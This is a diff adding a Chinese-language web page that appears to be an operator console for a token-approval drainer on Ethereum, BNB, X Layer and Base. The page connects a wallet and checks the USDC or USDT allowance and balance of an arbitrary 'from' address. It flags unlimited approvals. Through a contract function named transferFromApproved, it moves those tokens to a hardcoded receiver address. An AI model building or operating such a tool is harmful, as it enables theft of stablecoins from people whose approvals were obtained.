@@ -1,0 +1,441 @@
+<!doctype html>
+<html lang="zh">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=0.8, maximum-scale=0.8">
+
+  <title>代币授权、余额与转账工具</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+  <style>
+    body {
+      font-family: "Microsoft YaHei", Arial, sans-serif;
+      padding: 30px;
+      max-width: 600px;
+      margin: auto;
+    }
+    h2 { color: #333; }
+    input, select, button {
+      display: block;
+      margin: 8px 0;
+      padding: 10px;
+      width: 100%;
+      box-sizing: border-box;
+      font-size: 14px;
+    }
+
+    /* 按钮通用样式 */
+    button {
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: transform 0.1s ease, filter 0.2s ease;
+    }
+
+    button:hover { filter: brightness(1.1); }
+    button:active { transform: scale(0.95); }
+
+    /* 每个按钮独立颜色 */
+    #connectBtn { background: #4CAF50; }       /* 绿色 */
+    #disconnectBtn { background: #f44336; }    /* 红色 */
+    #checkDecimalsBtn { background: #2196F3; } /* 蓝色 */
+    #checkAllowanceBtn { background: #2196F3; }/* 蓝色 */
+    #checkReceiverBalanceBtn { background: #2196F3; } /* 蓝色 */
+    #transferBtn { background: #4CAF50; }      /* 绿色 */
+
+    /* 点击动画 */
+    button.animate {
+      animation: clickScale 0.2s ease;
+    }
+
+    @keyframes clickScale {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
+
+    #walletAddress { color: #006400; font-weight: bold; margin-top: 10px; }
+    #networkInfo { color: #cc0000; font-size: 13px; margin-bottom: 5px; font-weight: bold; }
+    #decimalTip, #allowanceTip, #balanceTip, #receiverBalanceTip {
+      font-size: 13px;
+      margin: 5px 0 10px;
+      font-weight: bold;
+    }
+    #decimalTip { color: #cc6600; }
+    #allowanceTip { color: #0066cc; }
+    #balanceTip { color: #008000; }
+    #receiverBalanceTip { color: #9932CC; }
+    #log {
+      margin-top: 20px;
+      background: #f7f7f7;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 13px;
+      white-space: pre-line;
+      min-height: 100px;
+    }
+    a.tx-link {
+      color: #007bff;
+      text-decoration: none;
+      word-break: break-all;
+    }
+    a.tx-link:hover { text-decoration: underline; }
+
+    /* 新增：授权地址标签样式 */
+    .auth-label {
+      font-weight: bold;
+      color: #d60000;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>代币授权与转账工具</h2>
+
+  <button id="connectBtn" onclick="connectWallet()">连接钱包</button>
+  <button id="disconnectBtn" onclick="disconnectWallet()" disabled>断开钱包</button>
+  <p id="walletAddress">未连接</p>
+  <p id="networkInfo"></p>
+
+  <label>授权合约地址（ApproveAndTransferBlod.sol）:</label>
+  <select id="contractAddr" disabled></select>
+
+  <label>授权代币:</label>
+  <select id="tokenSelect" disabled></select>
+
+  <label>代币合约地址:</label>
+  <input id="tokenAddr" readonly>
+
+  <p id="decimalTip"></p>
+  <button id="checkDecimalsBtn" onclick="checkDecimals()">检测 Token 精度</button>
+
+  <!-- 改动部分：标签内容、样式 -->
+  <label class="auth-label">授权地址(转出FROM):</label>
+  <input id="fromAddr" value="">
+  <!-- 新增：显示区块浏览器地址 -->
+  <p id="fromExplorerLink"></p>
+  <p id="allowanceTip"></p>
+  <p id="balanceTip"></p>
+  <button id="checkAllowanceBtn" onclick="checkAllowance()">检测授权额度 + 余额</button>
+
+  <label>接收地址（to）:</label>
+  <input id="toAddr" value="0xfde98886f6b4371f96a5b0f95252961efd7ac4c3">
+  <p id="receiverBalanceTip"></p>
+  <button id="checkReceiverBalanceBtn" onclick="checkReceiverBalance()">检测接收地址余额</button>
+
+  <label>转账数量:</label>
+  <input id="amount" placeholder="请输入要转账的数量（无需手写精度后台自动添加）">
+  <button id="transferBtn" onclick="transferToken()" disabled>执行转账</button>
+
+  <div id="log"></div>
+
+  <!-- 新增提示音 -->
+  <audio id="clickSound" src="https://cdn.pixabay.com/download/audio/2025/08/05/audio_233bbdc401.mp3?filename=bible_images-google-sound-effect-2-385178.mp3" preload="auto"></audio>
+  <script> const sound = document.getElementById('clickSound');sound.volume = 0.3; </script>
+
+  <script>
+    const NETWORK_INFO = {
+      1: { name: "以太坊主网", explorer: "https://etherscan.io/tx/" },
+      56: { name: "BNB 主网", explorer: "https://bscscan.com/tx/" },
+      196: { name: "X Layer 主网", explorer: "https://web3.okx.com/zh-hans/explorer/x-layer/tx/" },
+      8453: { name: "Base 主网", explorer: "https://basescan.org/tx/" }
+    };
+
+    const ERC20_ABI = [
+      "function decimals() view returns (uint8)",
+      "function allowance(address owner, address spender) view returns (uint256)",
+      "function balanceOf(address account) view returns (uint256)"
+    ];
+
+    const DEMO_ABI = [
+      "function transferFromApproved(address token,address from,address to,uint256 amount) external returns (bool)"
+    ];
+
+    let provider, signer, userAddress, tokenDecimals = 18, chainId = null;
+
+    const CONTRACT_MAP = {
+      1: {
+        contracts: ["0x403618227cc185eab902abe4caf6c15c8bd6a302"],
+        tokens: [
+          { name: "USDC", addr: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48" },
+          { name: "USDT", addr: "0xdac17f958d2ee523a2206206994597c13d831ec7" }
+        ]
+      },
+      56: {
+        contracts: ["0x32bef8c3c420f1298a742bb6681d0f0bb1f5aa2e"],
+        tokens: [
+          { name: "USDC", addr: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d" },
+          { name: "USDT", addr: "0x55d398326f99059ff775485246999027b3197955" }
+        ]
+      },
+      196: {
+        contracts: ["0x0d30fb5377e51f3dcb124a6e9720c452ea019402"],
+        tokens: [
+          { name: "USDT", addr: "0x779ded0c9e1022225f8e0630b35a9b54be713736" },
+          { name: "USDC", addr: "0x74b7f16337b8972027f6196a17a631ac6de26d22" }
+        ]
+      },
+      8453: {
+        contracts: ["0xf1d9649401b9672beb8d750ee469a6335ddaeca9"],
+        tokens: [
+          { name: "USDC", addr: "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913" },
+          { name: "USDT", addr: "0xfde4c96c8593536e31f229ea8f37b2ada2699bb2" }
+        ]
+      }
+    };
+
+    function updateFromAddressExplorer() {
+      const addr = document.getElementById("fromAddr").value.trim();
+      const info = NETWORK_INFO[chainId];
+      const linkBox = document.getElementById("fromExplorerLink");
+      if (addr && info && info.explorer) {
+        const base = info.explorer.replace("tx/", "address/");
+        const url = base + addr;
+        linkBox.innerHTML = `<a href="${url}" target="_blank" class="tx-link">${url}</a>`;
+      } else {
+        linkBox.innerHTML = "";
+      }
+    }
+
+    document.getElementById("fromAddr").addEventListener("input", updateFromAddressExplorer);
+
+    function updateContractInputsByChain(chainId) {
+      const contractSelect = document.getElementById("contractAddr");
+      const tokenSelect = document.getElementById("tokenSelect");
+      contractSelect.innerHTML = "";
+      tokenSelect.innerHTML = "";
+      const config = CONTRACT_MAP[chainId];
+      if (config) {
+        contractSelect.disabled = false;
+        config.contracts.forEach(addr => {
+          const opt = document.createElement("option");
+          opt.value = addr;
+          opt.textContent = addr;
+          contractSelect.appendChild(opt);
+        });
+        tokenSelect.disabled = false;
+        config.tokens.forEach(t => {
+          const option = document.createElement("option");
+          option.value = t.name;
+          option.textContent = t.name;
+          tokenSelect.appendChild(option);
+        });
+        document.getElementById("tokenAddr").value = config.tokens[0].addr;
+      } else {
+        contractSelect.disabled = true;
+        tokenSelect.disabled = true;
+        document.getElementById("tokenAddr").value = "";
+      }
+      updateFromAddressExplorer();
+    }
+
+    document.getElementById("tokenSelect").addEventListener("change", function() {
+      const config = CONTRACT_MAP[chainId];
+      if (!config) return;
+      const selected = config.tokens.find(t => t.name === this.value);
+      if (selected) document.getElementById("tokenAddr").value = selected.addr;
+    });
+
+    async function checkReceiverBalance() {
+      playClickSound();
+      try {
+        const tokenAddr = document.getElementById("tokenAddr").value.trim();
+        const toAddr = document.getElementById("toAddr").value.trim();
+        if (!tokenAddr || !toAddr) return log("请先填写接收地址并选择代币。");
+        const token = new ethers.Contract(tokenAddr, ERC20_ABI, provider);
+        const decimals = await token.decimals();
+        const balanceRaw = await token.balanceOf(toAddr);
+        const balanceReadable = ethers.utils.formatUnits(balanceRaw, decimals);
+        document.getElementById("receiverBalanceTip").innerText = `接收地址余额：${balanceReadable}`;
+        log(`接收地址余额：${balanceReadable}`);
+      } catch (err) {
+        log("检测接收地址余额失败：" + (err.message || err));
+      }
+    }
+
+    async function connectWallet() {
+      playClickSound();
+      try {
+        if (!window.ethereum && !window.okxwallet) {
+          alert("请安装 MetaMask 或 OKX Wallet 插件！");
+          return;
+        }
+        const ethProvider = window.ethereum || window.okxwallet;
+        provider = new ethers.providers.Web3Provider(ethProvider);
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        userAddress = await signer.getAddress();
+        const network = await provider.getNetwork();
+        chainId = network.chainId;
+        const networkInfo = NETWORK_INFO[chainId] || { name: "未知网络", explorer: "" };
+        document.getElementById("walletAddress").innerText = "已连接钱包：" + userAddress;
+        document.getElementById("networkInfo").innerText = `当前网络：${networkInfo.name} (Chain ID: ${chainId})`;
+        document.getElementById("connectBtn").disabled = true;
+        document.getElementById("disconnectBtn").disabled = false;
+        document.getElementById("checkDecimalsBtn").disabled = false;
+        document.getElementById("checkAllowanceBtn").disabled = false;
+        document.getElementById("transferBtn").disabled = false;
+        log(`钱包连接成功：${userAddress}`);
+        updateContractInputsByChain(chainId);
+      } catch (err) {
+        log("连接失败：" + (err.message || err));
+      }
+    }
+
+    function disconnectWallet() {
+      playClickSound();
+      provider = null;
+      signer = null;
+      userAddress = null;
+      chainId = null;
+      document.getElementById("walletAddress").innerText = "未连接";
+      document.getElementById("networkInfo").innerText = "";
+      document.getElementById("connectBtn").disabled = false;
+      document.getElementById("disconnectBtn").disabled = true;
+      document.getElementById("checkDecimalsBtn").disabled = true;
+      document.getElementById("checkAllowanceBtn").disabled = true;
+      document.getElementById("transferBtn").disabled = true;
+      document.getElementById("decimalTip").innerText = "";
+      document.getElementById("allowanceTip").innerText = "";
+      document.getElementById("balanceTip").innerText = "";
+      document.getElementById("receiverBalanceTip").innerText = "";
+      document.getElementById("fromExplorerLink").innerHTML = "";
+      document.getElementById("log").innerText = "";
+      document.getElementById("contractAddr").disabled = true;
+      document.getElementById("tokenSelect").disabled = true;
+    }
+
+    async function checkDecimals() {
+      playClickSound();
+      try {
+        const tokenAddr = document.getElementById("tokenAddr").value.trim();
+        if (!tokenAddr) return log("请先选择代币。");
+        const token = new ethers.Contract(tokenAddr, ERC20_ABI, provider);
+        tokenDecimals = await token.decimals();
+        document.getElementById("decimalTip").innerText = `精度 ${tokenDecimals}`;
+        log(`Token 精度为 ${tokenDecimals}`);
+      } catch (err) {
+        log("无法读取 Token 精度：" + (err.message || err));
+      }
+    }
+
+    async function checkAllowance() {
+      playClickSound();
+      try {
+        const tokenAddr = document.getElementById("tokenAddr").value.trim();
+        const fromAddr = document.getElementById("fromAddr").value.trim();
+        const spenderAddr = document.getElementById("contractAddr").value.trim();
+        if (!tokenAddr || !fromAddr || !spenderAddr)
+          return log("请保证Token合约地址、授权地址和授权合约地址栏不为空!");
+        const token = new ethers.Contract(tokenAddr, ERC20_ABI, provider);
+
+        const decimals = await token.decimals();
+        tokenDecimals = decimals;
+
+        const [allowanceRaw, balanceRaw] = await Promise.all([
+          token.allowance(fromAddr, spenderAddr),
+          token.balanceOf(fromAddr)
+        ]);
+
+        const allowanceBigInt = BigInt(allowanceRaw.toString());
+        const threshold = BigInt("1" + "0".repeat(60));
+        const isUnlimited = allowanceBigInt >= threshold;
+
+        const allowanceDisplay = isUnlimited
+          ? "无限授权"
+          : ethers.utils.formatUnits(allowanceRaw, decimals);
+
+        const balanceReadable = ethers.utils.formatUnits(balanceRaw, decimals);
+
+        document.getElementById("allowanceTip").innerText = `当前授权额度：${allowanceDisplay}`;
+        document.getElementById("balanceTip").innerText = `当前地址余额：${balanceReadable}`;
+        log(`授权额度 ${allowanceDisplay}, 余额 ${balanceReadable}`);
+      } catch (err) {
+        log("检测授权或余额失败：" + (err.message || err));
+      }
+    }
+
+    async function transferToken() {
+      playClickSound();
+      try {
+        const contractAddr = document.getElementById("contractAddr").value.trim();
+        const tokenAddr = document.getElementById("tokenAddr").value.trim();
+        const fromAddr = document.getElementById("fromAddr").value.trim();
+        const toAddr = document.getElementById("toAddr").value.trim();
+        const amount = document.getElementById("amount").value.trim();
+        if (!contractAddr || !tokenAddr || !fromAddr || !toAddr || !amount)
+          return log("请填写完整信息再执行转账。");
+        const contract = new ethers.Contract(contractAddr, DEMO_ABI, signer);
+        const amountWei = ethers.utils.parseUnits(amount, tokenDecimals);
+        log("正在提交转账交易...");
+        const tx = await contract.transferFromApproved(tokenAddr, fromAddr, toAddr, amountWei);
+        log("交易已发送，等待确认：" + makeTxLink(tx.hash));
+        await tx.wait();
+        log("转账成功！交易哈希：" + makeTxLink(tx.hash));
+      } catch (err) {
+        log("转账失败：" + (err.message || err));
+      }
+    }
+
+    function makeTxLink(hash) {
+      const net = NETWORK_INFO[chainId];
+      if (!net || !net.explorer) return hash;
+      const url = net.explorer + hash;
+      return `<a href="${url}" target="_blank" class="tx-link">${hash}</a>`;
+    }
+
+    function log(msg) {
+      const logBox = document.getElementById("log");
+      const time = new Date().toLocaleTimeString();
+      logBox.innerHTML += `[${time}] ${msg}<br>`;
+    }
+
+    function playClickSound() {
+      const sound = document.getElementById("clickSound");
+      if (sound) {
+        sound.currentTime = 0;
+        sound.play().catch(() => {});
+      }
+    }
+
+    function addClickAnimation(btn) {
+      btn.classList.add("animate");
+      setTimeout(() => btn.classList.remove("animate"), 200);
+    }
+
+    document.querySelectorAll("button").forEach(btn => {
+      btn.addEventListener("click", () => {
+        playClickSound();
+        addClickAnimation(btn);
+      });
+    });
+
+    if (window.ethereum || window.okxwallet) {
+      const walletProvider = window.ethereum || window.okxwallet;
+      walletProvider.on("chainChanged", (newChainIdHex) => {
+        const newChainId = parseInt(newChainIdHex, 16);
+        const networkInfo = NETWORK_INFO[newChainId] || { name: "未知网络", explorer: "" };
+        chainId = newChainId;
+        provider = new ethers.providers.Web3Provider(walletProvider);
+        signer = provider.getSigner();
+        document.getElementById("networkInfo").innerText = `当前网络：${networkInfo.name} (Chain ID: ${newChainId})`;
+        log(`网络已切换为：${networkInfo.name} (Chain ID: ${newChainId})`);
+        updateContractInputsByChain(newChainId);
+      });
+      walletProvider.on("accountsChanged", async (accounts) => {
+        if (accounts.length === 0) {
+          disconnectWallet();
+          log("钱包已断开连接或未检测到账户。");
+        } else {
+          userAddress = accounts[0];
+          provider = new ethers.providers.Web3Provider(walletProvider);
+          signer = provider.getSigner();
+          document.getElementById("walletAddress").innerText = "已连接钱包：" + userAddress;
+          log(`已切换账户：${userAddress}`);
+        }
+      });
+    }
+  </script>
+</body>
+</html>
